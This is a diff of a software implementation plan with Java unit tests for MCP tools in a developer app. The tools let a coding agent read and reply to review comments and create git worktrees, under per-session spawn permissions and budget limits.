+    final List<RepoSummary> repositories = new ArrayList<>();
+    final List<SessionSummary> sessions = new ArrayList<>();
+    final List<Path> worktrees = new ArrayList<>();
+    final Set<String> remotes = new LinkedHashSet<>(Set.of("origin"));
+    final Map<String, String> excerpts = new HashMap<>();
+    final Map<String, Path> createdWorktrees = new HashMap<>();
+    final List<Path> startedSessions = new ArrayList<>();
+    final List<String> startedPrompts = new ArrayList<>();
+
+    /** When set, {@link #createWorktree} and {@link #startSession} throw this. */
+    McpToolException failure;
+
+    @Override
+    public Optional<Path> repositoryRoot(ManagedSessionId caller) {
+        return repositoryRoot;
+    }
+
+    @Override
+    public Optional<Path> worktreePath(ManagedSessionId caller) {
+        return worktreePath;
+    }
+
+    @Override
+    public Optional<String> baseBranch(ManagedSessionId caller) {
+        return baseBranch;
+    }
+
+    @Override
+    public List<ReviewAnnotation> annotations(ManagedSessionId caller) {
+        return List.copyOf(annotations);
+    }
+
+    @Override
+    public void updateAnnotation(ReviewAnnotation annotation) {
+        annotations.replaceAll(existing -> existing.id().equals(annotation.id()) ? annotation : existing);
+    }
+
+    @Override
+    public Optional<String> excerpt(ManagedSessionId caller, String file, int line, int context) {
+        return Optional.ofNullable(excerpts.get(file + ":" + line));
+    }
+
+    @Override
+    public List<RepoSummary> repositories() {
+        return List.copyOf(repositories);
+    }
+
+    @Override
+    public List<SessionSummary> sessions() {
+        return List.copyOf(sessions);
+    }
+
+    @Override
+    public Set<String> remoteNames(ManagedSessionId caller) {
+        return Set.copyOf(remotes);
+    }
+
+    @Override
+    public List<Path> realWorktreesOf(ManagedSessionId caller) {
+        return List.copyOf(worktrees);
+    }
+
+    @Override
+    public Path createWorktree(ManagedSessionId caller, String branch, Optional<String> startPoint)
+            throws McpToolException {
+        if (failure != null) {
+            throw failure;
+        }
+        Path root = repositoryRoot.orElseThrow();
+        Path created = root.resolveSibling("wt-" + branch.replace('/', '-'));
+        createdWorktrees.put(branch, created);
+        return created;
+    }
+
+    @Override
+    public ManagedSessionId startSession(Path worktree, Optional<String> initialPrompt) throws McpToolException {
+        if (failure != null) {
+            throw failure;
+        }
+        startedSessions.add(worktree);
+        initialPrompt.ifPresent(startedPrompts::add);
+        return ManagedSessionId.newId();
     }
 }
 ```
@@ -726,6 +1413,7 @@ package app.drydock.mcp;
 
 import app.drydock.domain.ManagedSessionId;
 import app.drydock.git.DiffScope;
+import app.drydock.mcp.McpSessionRegistry.Spawn;
 import app.drydock.review.AnnotationStatus;
 import app.drydock.review.ReviewAnnotation;
 import app.drydock.state.json.JsonValue;
@@ -751,6 +1439,7 @@ class McpToolRouterReadTest {
 
     private final ManagedSessionId caller = ManagedSessionId.newId();
     private FakeMcpSessionContext context;
+    private McpSessionRegistry registry;
     private McpToolRouter router;
 
     @BeforeEach
@@ -758,7 +1447,9 @@ class McpToolRouterReadTest {
         context = new FakeMcpSessionContext();
         context.repositoryRoot = Optional.of(Path.of("/repos/drydock"));
         context.worktreePath = Optional.of(Path.of("/repos/drydock"));
-        router = new McpToolRouter(context);
+        registry = new McpSessionRegistry();
+        registry.mint(caller, Spawn.ALLOWED);
+        router = new McpToolRouter(context, registry);
     }
 
     private ReviewAnnotation annotation(String file, String key, AnnotationStatus status) {
@@ -773,12 +1464,12 @@ class McpToolRouterReadTest {
                 .map(descriptor -> str(descriptor, "name"))
                 .toList();
 
-        assertEquals(List.of("review_comments", "review_mark_addressed", "worktree_create",
+        assertEquals(List.of("review_comments", "review_reply", "worktree_create",
                 "session_start", "repos_list", "sessions_list"), names);
     }
 
     @Test
-    void everyToolDescriptorCarriesAnInputSchema() {
+    void everyToolDescriptorCarriesADescriptionAndAnObjectSchema() {
         for (JsonValue descriptor : router.toolDescriptors()) {
             assertEquals("object", str(JsonPeek.field(descriptor, "inputSchema"), "type"),
                     "missing inputSchema on " + str(descriptor, "name"));
@@ -790,6 +1481,7 @@ class McpToolRouterReadTest {
     @Test
     void reviewCommentsReportsOpenThreadsWithDecodedLines() throws Exception {
         context.annotations.add(annotation("src/Main.java", "n42", AnnotationStatus.OPEN));
+        context.excerpts.put("src/Main.java:42", "  41: prev\n> 42: return cfg.value();\n  43: next");
 
         JsonValue result = router.call(caller, "review_comments", noArgs());
 
@@ -799,12 +1491,33 @@ class McpToolRouterReadTest {
         assertEquals(42, num(comments.get(0), "line"));
         assertEquals(false, bool(comments.get(0), "deleted_line"));
         assertEquals("OPEN", str(comments.get(0), "status"));
+        assertEquals("  41: prev\n> 42: return cfg.value();\n  43: next", str(comments.get(0), "excerpt"));
         assertEquals("needs a null check", str(array(comments.get(0), "thread").get(0), "text"));
         assertEquals("You", str(array(comments.get(0), "thread").get(0), "author"));
     }
 
     @Test
-    void reviewCommentsMarksDeletedLinesSoTheAgentDoesNotHuntForThem() throws Exception {
+    void reviewCommentsCarriesTheBaseBranchSoTheDiffIsReproducible() throws Exception {
+        context.baseBranch = Optional.of("develop");
+        context.annotations.add(annotation("src/Main.java", "n1", AnnotationStatus.OPEN));
+
+        JsonValue result = router.call(caller, "review_comments", noArgs());
+
+        assertEquals("develop", str(result, "base_branch"));
+    }
+
+    @Test
+    void anAbsentBaseBranchIsJsonNullNotAMissingField() throws Exception {
+        context.baseBranch = Optional.empty();
+        context.annotations.add(annotation("src/Main.java", "n1", AnnotationStatus.OPEN));
+
+        JsonValue result = router.call(caller, "review_comments", noArgs());
+
+        assertEquals(JsonValue.JsonNull.INSTANCE, JsonPeek.field(result, "base_branch"));
+    }
+
+    @Test
+    void aDeletedLineHasNoExcerptAndSaysHowToSeeIt() throws Exception {
         context.annotations.add(annotation("src/Gone.java", "o17", AnnotationStatus.OPEN));
 
         JsonValue result = router.call(caller, "review_comments", noArgs());
@@ -812,10 +1525,24 @@ class McpToolRouterReadTest {
         JsonValue comment = array(result, "comments").get(0);
         assertEquals(17, num(comment, "line"));
         assertEquals(true, bool(comment, "deleted_line"));
+        assertEquals(JsonValue.JsonNull.INSTANCE, JsonPeek.field(comment, "excerpt"));
+        assertTrue(str(comment, "hint").contains("git show"),
+                "a deleted line is not in the working tree; say how to see it: " + str(comment, "hint"));
     }
 
     @Test
-    void reviewCommentsIncludesSentButNotResolvedOrAddressed() throws Exception {
+    void aMissingExcerptIsJsonNullNotAnError() throws Exception {
+        // The file may have been deleted, or the line may be past its end.
+        context.annotations.add(annotation("src/Main.java", "n999", AnnotationStatus.OPEN));
+
+        JsonValue result = router.call(caller, "review_comments", noArgs());
+
+        assertEquals(JsonValue.JsonNull.INSTANCE,
+                JsonPeek.field(array(result, "comments").get(0), "excerpt"));
+    }
+
+    @Test
+    void reviewCommentsIncludesSentButNotResolvedAddressedOrFixed() throws Exception {
         context.annotations.add(annotation("a.java", "n1", AnnotationStatus.OPEN));
         context.annotations.add(annotation("b.java", "n2", AnnotationStatus.SENT));
         context.annotations.add(annotation("c.java", "n3", AnnotationStatus.RESOLVED));
@@ -849,7 +1576,8 @@ class McpToolRouterReadTest {
         McpToolException failure = assertThrows(McpToolException.class,
                 () -> router.call(caller, "review_comments", args("scope", "SIDEWAYS")));
 
-        assertTrue(failure.getMessage().contains("WORKING_TREE"), "should list the valid scopes: " + failure.getMessage());
+        assertTrue(failure.getMessage().contains("WORKING_TREE"),
+                "should list the valid scopes: " + failure.getMessage());
     }
 
     @Test
@@ -865,27 +1593,40 @@ class McpToolRouterReadTest {
     }
 
     @Test
-    void reposListReportsEveryRegisteredRepository() throws Exception {
+    void reposListReportsLocalRepositoriesWithGitState() throws Exception {
         context.repositories.add(new McpSessionContext.RepoSummary("drydock", Path.of("/repos/drydock"),
-                Optional.of("feat/mcp"), true, 2, 0, false));
-        context.repositories.add(new McpSessionContext.RepoSummary("consumer", Path.of("/repos/consumer"),
-                Optional.of("main"), false, 0, 0, false));
+                Optional.of("feat/mcp"), Optional.of(true), Optional.of(2), Optional.of(0), false));
 
         JsonValue result = router.call(caller, "repos_list", noArgs());
 
-        List<JsonValue> repos = array(result, "repositories");
-        assertEquals(2, repos.size());
-        assertEquals("drydock", str(repos.get(0), "name"));
-        assertEquals("feat/mcp", str(repos.get(0), "branch"));
-        assertEquals(true, bool(repos.get(0), "dirty"));
-        assertEquals(2, num(repos.get(0), "ahead"));
-        assertEquals(false, bool(repos.get(1), "dirty"));
+        JsonValue repo = array(result, "repositories").get(0);
+        assertEquals("drydock", str(repo, "name"));
+        assertEquals("feat/mcp", str(repo, "branch"));
+        assertEquals(true, bool(repo, "dirty"));
+        assertEquals(2, num(repo, "ahead"));
+        assertEquals(false, bool(repo, "remote"));
+    }
+
+    @Test
+    void reposListReportsRemoteRepositoriesWithoutGitState() throws Exception {
+        // Probing a remote target runs ssh with its own timeout, and
+        // GitStatusService has no cache; one tool call must not open N
+        // ssh connections.
+        context.repositories.add(new McpSessionContext.RepoSummary("far", Path.of("/srv/far"),
+                Optional.of("main"), Optional.empty(), Optional.empty(), Optional.empty(), true));
+
+        JsonValue result = router.call(caller, "repos_list", noArgs());
+
+        JsonValue repo = array(result, "repositories").get(0);
+        assertEquals(true, bool(repo, "remote"));
+        assertEquals(JsonValue.JsonNull.INSTANCE, JsonPeek.field(repo, "dirty"));
+        assertEquals(JsonValue.JsonNull.INSTANCE, JsonPeek.field(repo, "ahead"));
     }
 
     @Test
     void anAbsentBranchIsJsonNullNotAMissingField() throws Exception {
         context.repositories.add(new McpSessionContext.RepoSummary("detached", Path.of("/repos/detached"),
-                Optional.empty(), false, 0, 0, false));
+                Optional.empty(), Optional.of(false), Optional.of(0), Optional.of(0), false));
 
         JsonValue result = router.call(caller, "repos_list", noArgs());
 
@@ -937,19 +1678,19 @@ Expected: FAIL — `McpToolRouter` does not exist.
 
 - [ ] **Step 6: Write the router**
 
-Create `app/src/main/java/app/drydock/mcp/McpToolRouter.java`. Implement `toolDescriptors()` returning the six descriptors in the order the test asserts, each with `name`, `description`, and a JSON-Schema `inputSchema`; and `call(caller, tool, arguments)` dispatching on the name. In this task, `worktree_create`, `session_start`, and `review_mark_addressed` may throw `new McpToolException("not implemented yet")` — Tasks 4 and 5 fill them in. Required behavior for this task:
+Create `app/src/main/java/app/drydock/mcp/McpToolRouter.java`. Implement `toolDescriptors()` returning six descriptors in the order the test asserts, each with `name`, `description`, and a JSON-Schema `inputSchema` whose `type` is `"object"`; and `call(caller, tool, arguments)` dispatching on the name. In this task, `review_reply`, `worktree_create`, and `session_start` may throw `new McpToolException("not implemented yet")` — Tasks 7–9 fill them in. Required behavior here:
 
-- `review_comments`: read `annotations(caller)`; keep `OPEN` and `SENT` only; if an optional `scope` argument is present, parse it against `DiffScope` and reject an unknown value with a message listing `WORKING_TREE`, `UPSTREAM`, `BASE`; decode `startKey` via `AnnotationLines.decode`, catching `IllegalArgumentException` to **skip** that annotation with a `LOG.log(Level.WARNING, ...)` (a corrupt key must not fail the whole call); emit `id`, `file`, `line`, `deleted_line`, `status`, `scope`, `thread` (each message with `author`, `at`, `text`).
-- `repos_list` and `sessions_list`: map the summary records straight through. Absent branches become `JsonNull.INSTANCE`, never a missing field.
-- Every tool first resolves `repositoryRoot(caller)`, and throws `McpToolException("Session has ended; its repository is no longer available.")` when empty.
+- Every tool first resolves `repositoryRoot(caller)` and throws `McpToolException("Session has ended; its repository is no longer available.")` when empty.
+- `review_comments`: read `annotations(caller)`; keep `OPEN` and `SENT` only; if a `scope` argument is present, parse it against `DiffScope` and reject an unknown value with a message listing `WORKING_TREE`, `UPSTREAM`, `BASE`; decode `startKey` via `AnnotationLines.decode`, catching `IllegalArgumentException` to **skip** that annotation with a `LOG.log(Level.WARNING, ...)` (a corrupt key must not fail the whole call). Emit a top-level `base_branch` plus `comments`, each with `id`, `file`, `line`, `deleted_line`, `status`, `scope`, `excerpt`, `hint`, and `thread` (`author`, `at`, `text`). For a post-image line, `excerpt` comes from `context.excerpt(caller, file, line, 2)` and `hint` is null; for a deleted line, `excerpt` is null and `hint` says to use `git show <base_branch>:<file>`.
+- `repos_list` and `sessions_list`: map the summary records through. Every absent `Optional` becomes `JsonNull.INSTANCE`, never a missing field.
 - An unknown tool name throws `McpToolException` naming the tool.
 
-Values are built with the sealed `JsonValue` records — `new JsonObject(Map)` or `JsonObject.empty().put(...)`, `new JsonArray(List)`, `new JsonString(...)`, `JsonNumber.of(long)`, `new JsonBoolean(...)`, `JsonNull.INSTANCE`. Reading arguments uses `JsonObject.has(key)` before `get(key)`, because `get` returns `null` for an absent key. Add a private helper for "required non-blank string argument" and one for "optional string argument"; every tool needs both, and duplicating the null-and-blank dance six times is how one of them ends up subtly different.
+Values are built with the sealed `JsonValue` records — `new JsonObject(Map)` or `JsonObject.empty().put(...)`, `new JsonArray(List)`, `new JsonString(...)`, `JsonNumber.of(long)`, `new JsonBoolean(...)`, `JsonNull.INSTANCE`. Reading arguments uses `JsonObject.has(key)` before `get(key)`, because `get` returns `null` for an absent key. Add private helpers for "required non-blank string argument", "optional string argument", and "optional boolean argument"; every tool needs them, and duplicating the null-and-blank dance six times is how one of them ends up subtly different.
 
 - [ ] **Step 7: Run tests to verify they pass**
 
 Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpToolRouterReadTest'`
-Expected: PASS (13 tests)
+Expected: PASS (17 tests)
 
 - [ ] **Step 8: Commit**
 
@@ -960,29 +1701,28 @@ git commit -m "feat(mcp): read-only tools for review comments, repos, and sessio
 
 ---
 
-### Task 4: `review_mark_addressed`
+### Task 7: `review_reply`
 
 **Files:**
 - Modify: `app/src/main/java/app/drydock/mcp/McpToolRouter.java`
-- Modify: the Review annotation view under `app/src/main/java/app/drydock/ui/review/`
-- Test: `app/src/test/java/app/drydock/mcp/McpToolRouterAnnotationWriteTest.java`
+- Test: `app/src/test/java/app/drydock/mcp/McpToolRouterReplyTest.java`
 
 **Interfaces:**
-- Consumes: `McpToolRouter.call` (Task 3), `AnnotationStatus.ADDRESSED` (Task 2), `ReviewAnnotation.withStatus` / `withReply`, `McpSessionContext.updateAnnotation`.
-- Produces: no new public signatures; the `review_mark_addressed` tool becomes functional.
+- Consumes: `McpToolRouter.call` (Task 6), `AnnotationStatus.ADDRESSED` (Task 3), `ReviewAnnotation.withStatus`/`withReply`, `McpSessionContext.updateAnnotation`.
+- Produces: no new public signatures; `review_reply(id, note, addressed?)` becomes functional. `addressed` defaults to false.
 
 - [ ] **Step 1: Write the failing test**
 
-Create `app/src/test/java/app/drydock/mcp/McpToolRouterAnnotationWriteTest.java`:
+Create `app/src/test/java/app/drydock/mcp/McpToolRouterReplyTest.java`:
 
 ```java
 package app.drydock.mcp;
 
 import app.drydock.domain.ManagedSessionId;
 import app.drydock.git.DiffScope;
+import app.drydock.mcp.McpSessionRegistry.Spawn;
 import app.drydock.review.AnnotationStatus;
 import app.drydock.review.ReviewAnnotation;
-import app.drydock.state.json.JsonValue;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
 
@@ -992,11 +1732,12 @@ import java.util.List;
 import java.util.Optional;
 
 import static app.drydock.mcp.JsonPeek.args;
+import static app.drydock.mcp.JsonPeek.argsWithFlag;
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
-class McpToolRouterAnnotationWriteTest {
+class McpToolRouterReplyTest {
 
     private final ManagedSessionId caller = ManagedSessionId.newId();
     private FakeMcpSessionContext context;
@@ -1008,7 +1749,9 @@ class McpToolRouterAnnotationWriteTest {
         context = new FakeMcpSessionContext();
         context.repositoryRoot = Optional.of(Path.of("/repos/drydock"));
         context.worktreePath = Optional.of(Path.of("/repos/drydock"));
-        router = new McpToolRouter(context);
+        McpSessionRegistry registry = new McpSessionRegistry();
+        registry.mint(caller, Spawn.ALLOWED);
+        router = new McpToolRouter(context, registry);
         open = ReviewAnnotation.create(caller, DiffScope.BASE, "src/Main.java", "n42", "n42",
                 new ReviewAnnotation.Message("You", Instant.parse("2026-07-25T10:00:00Z"), "needs a null check"));
         context.annotations.add(open);
@@ -1022,20 +1765,29 @@ class McpToolRouterAnnotationWriteTest {
     }
 
     @Test
-    void markingAddressedSetsTheStatusAndAppendsAClaudeAuthoredNote() throws Exception {
-        router.call(caller, "review_mark_addressed",
-                args("id", open.id(), "note", "Added the null check in loadConfig()."));
+    void aReplyAppendsAClaudeAuthoredNoteAndLeavesTheStatusAlone() throws Exception {
+        router.call(caller, "review_reply", args("id", open.id(), "note", "Looking at this now."));
+
+        ReviewAnnotation updated = reloaded();
+        assertEquals(AnnotationStatus.OPEN, updated.status(), "a bare reply must not claim a fix");
+        assertEquals(2, updated.thread().size());
+        assertEquals("Claude", updated.thread().get(1).author());
+        assertEquals("Looking at this now.", updated.thread().get(1).text());
+    }
+
+    @Test
+    void addressedTrueSetsTheStatusAndStillAppendsTheNote() throws Exception {
+        router.call(caller, "review_reply",
+                argsWithFlag("addressed", true, "id", open.id(), "note", "Added the null check in loadConfig()."));
 
         ReviewAnnotation updated = reloaded();
         assertEquals(AnnotationStatus.ADDRESSED, updated.status());
-        assertEquals(2, updated.thread().size());
-        assertEquals("Claude", updated.thread().get(1).author());
         assertEquals("Added the null check in loadConfig().", updated.thread().get(1).text());
     }
 
     @Test
     void theHumansOriginalMessageIsPreserved() throws Exception {
-        router.call(caller, "review_mark_addressed", args("id", open.id(), "note", "done"));
+        router.call(caller, "review_reply", args("id", open.id(), "note", "done"));
 
         assertEquals("needs a null check", reloaded().thread().get(0).text());
         assertEquals("You", reloaded().thread().get(0).author());
@@ -1044,8 +1796,7 @@ class McpToolRouterAnnotationWriteTest {
     @Test
     void anUnknownAnnotationIdIsRejected() {
         McpToolException failure = assertThrows(McpToolException.class,
-                () -> router.call(caller, "review_mark_addressed",
-                        args("id", "no-such-id", "note", "done")));
+                () -> router.call(caller, "review_reply", args("id", "no-such-id", "note", "done")));
 
         assertTrue(failure.getMessage().contains("no-such-id"), failure.getMessage());
     }
@@ -1058,8 +1809,7 @@ class McpToolRouterAnnotationWriteTest {
         context.annotations.add(foreign);
 
         McpToolException failure = assertThrows(McpToolException.class,
-                () -> router.call(caller, "review_mark_addressed",
-                        args("id", foreign.id(), "note", "done")));
+                () -> router.call(caller, "review_reply", args("id", foreign.id(), "note", "done")));
 
         assertTrue(failure.getMessage().contains(foreign.id()), failure.getMessage());
         assertEquals(AnnotationStatus.OPEN, context.annotations.stream()
@@ -1070,34 +1820,55 @@ class McpToolRouterAnnotationWriteTest {
     @Test
     void aMissingNoteIsRejectedBecauseTheThreadWouldSayNothing() {
         assertThrows(McpToolException.class,
-                () -> router.call(caller, "review_mark_addressed", args("id", open.id())));
+                () -> router.call(caller, "review_reply", args("id", open.id())));
     }
 
     @Test
     void aBlankNoteIsRejected() {
         assertThrows(McpToolException.class,
-                () -> router.call(caller, "review_mark_addressed", args("id", open.id(), "note", "   ")));
+                () -> router.call(caller, "review_reply", args("id", open.id(), "note", "   ")));
     }
 
     @Test
-    void anAlreadyResolvedThreadIsNotDowngraded() {
+    void anAlreadyResolvedThreadIsNotTouched() {
         context.updateAnnotation(open.withStatus(AnnotationStatus.RESOLVED));
 
         McpToolException failure = assertThrows(McpToolException.class,
-                () -> router.call(caller, "review_mark_addressed", args("id", open.id(), "note", "done")));
+                () -> router.call(caller, "review_reply", args("id", open.id(), "note", "done")));
 
         assertTrue(failure.getMessage().contains("RESOLVED"), failure.getMessage());
         assertEquals(AnnotationStatus.RESOLVED, reloaded().status());
+        assertEquals(1, reloaded().thread().size(), "not even the note may be appended");
     }
 
     @Test
-    void markingAddressedTwiceIsAllowedAndAppendsBothNotes() throws Exception {
-        router.call(caller, "review_mark_addressed", args("id", open.id(), "note", "first attempt"));
-        router.call(caller, "review_mark_addressed", args("id", open.id(), "note", "second attempt"));
+    void aLegacyFixedThreadIsNotTouched() {
+        context.updateAnnotation(open.withStatus(AnnotationStatus.FIXED));
+
+        assertThrows(McpToolException.class,
+                () -> router.call(caller, "review_reply", args("id", open.id(), "note", "done")));
+    }
+
+    @Test
+    void replyingTwiceIsAllowedAndAppendsBothNotes() throws Exception {
+        router.call(caller, "review_reply",
+                argsWithFlag("addressed", true, "id", open.id(), "note", "first attempt"));
+        router.call(caller, "review_reply",
+                argsWithFlag("addressed", true, "id", open.id(), "note", "second attempt"));
 
         List<ReviewAnnotation.Message> thread = reloaded().thread();
         assertEquals(3, thread.size());
         assertEquals("second attempt", thread.get(2).text());
+        assertEquals(AnnotationStatus.ADDRESSED, reloaded().status());
+    }
+
+    @Test
+    void aSentThreadCanBeAddressed() throws Exception {
+        context.updateAnnotation(open.withStatus(AnnotationStatus.SENT));
+
+        router.call(caller, "review_reply",
+                argsWithFlag("addressed", true, "id", open.id(), "note", "done"));
+
         assertEquals(AnnotationStatus.ADDRESSED, reloaded().status());
     }
 }
@@ -1105,58 +1876,43 @@ class McpToolRouterAnnotationWriteTest {
 
 - [ ] **Step 2: Run test to verify it fails**
 
-Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpToolRouterAnnotationWriteTest'`
-Expected: FAIL — `review_mark_addressed` still throws "not implemented yet".
+Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpToolRouterReplyTest'`
+Expected: FAIL — `review_reply` still throws "not implemented yet".
 
 - [ ] **Step 3: Implement the tool**
 
-In `McpToolRouter`, replace the `review_mark_addressed` stub. Required behavior:
+In `McpToolRouter`, replace the `review_reply` stub:
 
-- Require a non-blank `id` and a non-blank `note`; reject either as missing with a message naming the argument.
-- Find the annotation among `annotations(caller)`. Not found — including an annotation that exists but belongs to another session, since `annotations(caller)` is already session-scoped — throws `McpToolException` naming the id.
-- Reject `RESOLVED` and `FIXED` with a message naming the current status: the human's verdict is final, and an agent must not reopen it.
-- Otherwise `annotation.withStatus(AnnotationStatus.ADDRESSED).withReply(new ReviewAnnotation.Message("Claude", Instant.now(), note))`, then `context.updateAnnotation(...)`.
-- Return an object with the annotation `id` and the new `status`.
+- Require a non-blank `id` and a non-blank `note`; reject either as missing with a message naming the argument. Read the optional boolean `addressed`, defaulting to false.
+- Find the annotation among `annotations(caller)`. Not found — including one that exists but belongs to another session, since `annotations(caller)` is already session-scoped — throws `McpToolException` naming the id.
+- Reject `RESOLVED` and `FIXED` with a message naming the current status, appending nothing: the human's verdict is final.
+- Otherwise `withReply(new ReviewAnnotation.Message("Claude", Instant.now(), note))`, then `withStatus(AnnotationStatus.ADDRESSED)` only when `addressed`, then `context.updateAnnotation(...)`.
+- Return the annotation `id` and the resulting `status`.
 
 - [ ] **Step 4: Run test to verify it passes**
 
-Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpToolRouterAnnotationWriteTest'`
-Expected: PASS (8 tests)
+Run: `./gradlew :app:test --tests 'app.drydock.mcp.McpToolRouterReplyTest'`
+Expected: PASS (11 tests)
 
-- [ ] **Step 5: Render `ADDRESSED` in the Review view**
-
-Find the annotation presentation code: `grep -rn "AnnotationStatus" app/src/main/java/app/drydock/ui/`. Add, following whatever pattern the file already uses for `SENT` and `RESOLVED`:
-
-- A distinct label and style for `ADDRESSED` — it must not look like the human's own `RESOLVED`. Label it "addressed by Claude".
-- A button or context action on an `ADDRESSED` thread that sets `RESOLVED`, so the human confirms.
-- Styling goes in the existing stylesheet under `app/src/main/resources/app/drydock/ui/`, not inline.
-
-- [ ] **Step 6: Verify the full suite still passes**
-
-Run: `./gradlew :app:test`
-Expected: PASS
-
-- [ ] **Step 7: Commit**
+- [ ] **Step 5: Commit**
 
 ```bash
 git add app/src/main/java/app/drydock/mcp/McpToolRouter.java \
-        app/src/main/java/app/drydock/ui/ \
-        app/src/main/resources/app/drydock/ui/ \
-        app/src/test/java/app/drydock/mcp/McpToolRouterAnnotationWriteTest.java
-git commit -m "feat(mcp): let an agent mark review threads addressed"
+        app/src/test/java/app/drydock/mcp/McpToolRouterReplyTest.java
+git commit -m "feat(mcp): let an agent reply to review threads and claim them addressed"
 ```
 
 ---
 
-### Task 5: `worktree_create` and `session_start`
+### Task 8: `worktree_create`
 
 **Files:**
 - Modify: `app/src/main/java/app/drydock/mcp/McpToolRouter.java`
 - Test: `app/src/test/java/app/drydock/mcp/McpToolRouterWorktreeTest.java`
 
 **Interfaces:**
-- Consumes: `McpSessionContext.createWorktree` / `worktreesOf` / `startSession` (Task 3), `app.drydock.ui.WorktreeNaming` (existing slug rules).
-- Produces: no new public signatures; both tools become functional.
+- Consumes: `McpSessionContext.createWorktree` / `remoteNames` (Task 6), `BranchNames.validate` (Task 5), `McpSessionRegistry.maySpawn` / `chargeWorktree` (Task 4).
+- Produces: no new public signatures.
 
 - [ ] **Step 1: Write the failing test**
 
@@ -1166,6 +1922,7 @@ Create `app/src/test/java/app/drydock/mcp/McpToolRouterWorktreeTest.java`:
 package app.drydock.mcp;
 
 import app.drydock.domain.ManagedSessionId;
+import app.drydock.mcp.McpSessionRegistry.Spawn;
 import app.drydock.state.json.JsonValue;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
@@ -1185,6 +1942,7 @@ class McpToolRouterWorktreeTest {
     private final ManagedSessionId caller = ManagedSessionId.newId();
     private final Path repo = Path.of("/repos/drydock");
     private FakeMcpSessionContext context;
+    private McpSessionRegistry registry;
     private McpToolRouter router;
 
     @BeforeEach
@@ -1193,7 +1951,9 @@ class McpToolRouterWorktreeTest {
         context.repositoryRoot = Optional.of(repo);
         context.worktreePath = Optional.of(repo);
         context.worktrees.add(repo);
-        router = new McpToolRouter(context);
+        registry = new McpSessionRegistry();
+        registry.mint(caller, Spawn.ALLOWED);
+        router = new McpToolRouter(context, registry);
     }
 
     @Test
@@ -1206,8 +1966,7 @@ class McpToolRouterWorktreeTest {
 
     @Test
     void worktreeCreatePassesAnExplicitStartPointThrough() throws Exception {
-        router.call(caller, "worktree_create",
-                args("branch", "feat/from-main", "start_point", "origin/main"));
+        router.call(caller, "worktree_create", args("branch", "feat/from-main", "start_point", "origin/main"));
 
         assertTrue(context.createdWorktrees.containsKey("feat/from-main"));
     }
@@ -1221,9 +1980,20 @@ class McpToolRouterWorktreeTest {
     }
 
     @Test
-    void worktreeCreateRejectsABlankBranchName() {
+    void aBranchNameThatShadowsARemoteIsRefusedBeforeGitRuns() {
+        McpToolException failure = assertThrows(McpToolException.class,
+                () -> router.call(caller, "worktree_create", args("branch", "origin/main")));
+
+        assertTrue(failure.getMessage().contains("origin"), failure.getMessage());
+        assertTrue(context.createdWorktrees.isEmpty(), "git must not have been called");
+    }
+
+    @Test
+    void aMalformedBranchNameIsRefusedBeforeGitRuns() {
         assertThrows(McpToolException.class,
-                () -> router.call(caller, "worktree_create", args("branch", "  ")));
+                () -> router.call(caller, "worktree_create", args("branch", "has space")));
+
+        assertTrue(context.createdWorktrees.isEmpty());
     }
 
     @Test
@@ -1237,65 +2007,52 @@ class McpToolRouterWorktreeTest {
     }
 
     @Test
-    void sessionStartOpensATabInAWorktreeOfTheCallersRepository() throws Exception {
-        Path sibling = Path.of("/repos/drydock-wt/try-a");
-        context.worktrees.add(sibling);
+    void anAgentStartedSessionMayNotCreateWorktrees() {
+        ManagedSessionId child = ManagedSessionId.newId();
+        registry.mint(child, Spawn.FORBIDDEN);
 
-        JsonValue result = router.call(caller, "session_start",
-                args("worktree_path", sibling.toString(), "prompt", "try approach A"));
-
-        assertEquals(sibling, context.startedSessions.get(0));
-        assertEquals("try approach A", context.startedPrompts.get(0));
-        assertTrue(str(result, "session_id").length() > 0);
-    }
-
-    @Test
-    void sessionStartWorksWithoutAPrompt() throws Exception {
-        Path sibling = Path.of("/repos/drydock-wt/try-b");
-        context.worktrees.add(sibling);
-
-        router.call(caller, "session_start", args("worktree_path", sibling.toString()));
-
-        assertEquals(sibling, context.startedSessions.get(0));
-        assertTrue(context.startedPrompts.isEmpty());
-    }
-
-    @Test
-    void sessionStartRefusesAPathThatIsNotAWorktreeOfTheCallersRepository() {
         McpToolException failure = assertThrows(McpToolException.class,
-                () -> router.call(caller, "session_start", args("worktree_path", "/repos/someone-else")));
+                () -> router.call(child, "worktree_create", args("branch", "feat/deeper")));
 
-        assertTrue(failure.getMessage().contains("/repos/someone-else"), failure.getMessage());
-        assertTrue(context.startedSessions.isEmpty(), "no session may be started");
+        assertTrue(failure.getMessage().toLowerCase().contains("started by an agent")
+                        || failure.getMessage().toLowerCase().contains("not permitted"),
+                failure.getMessage());
+        assertTrue(context.createdWorktrees.isEmpty());
     }
 
     @Test
-    void sessionStartRefusesAPrefixOfARealWorktreePath() {
-        // Membership test, never a string-prefix test: "/repos/drydock-evil"
-        // starts with "/repos/drydock" but is a different directory.
+    void theBudgetIsEnforcedAndNamesTheLimit() throws Exception {
+        for (int i = 0; i < McpSessionRegistry.MAX_WORKTREES_PER_SESSION; i++) {
+            router.call(caller, "worktree_create", args("branch", "feat/try-" + i));
+        }
+
         McpToolException failure = assertThrows(McpToolException.class,
-                () -> router.call(caller, "session_start", args("worktree_path", "/repos/drydock-evil")));
+                () -> router.call(caller, "worktree_create", args("branch", "feat/one-too-many")));
 
-        assertTrue(failure.getMessage().contains("/repos/drydock-evil"), failure.getMessage());
-        assertTrue(context.startedSessions.isEmpty());
+        assertTrue(failure.getMessage().contains(String.valueOf(McpSessionRegistry.MAX_WORKTREES_PER_SESSION)),
+                failure.getMessage());
     }
 
     @Test
-    void sessionStartAcceptsATraversalPathThatNormalizesOntoAWorktree() throws Exception {
-        // ".." normalizes onto a legitimate worktree. Canonicalizing BEFORE the
-        // membership test is what makes this accepted; it also proves the check
-        // is not a naive string compare. The normalized path is what starts.
-        router.call(caller, "session_start", args("worktree_path", "/repos/drydock/../drydock"));
+    void aRefusedBranchNameDoesNotSpendBudget() throws Exception {
+        assertThrows(McpToolException.class,
+                () -> router.call(caller, "worktree_create", args("branch", "origin/main")));
 
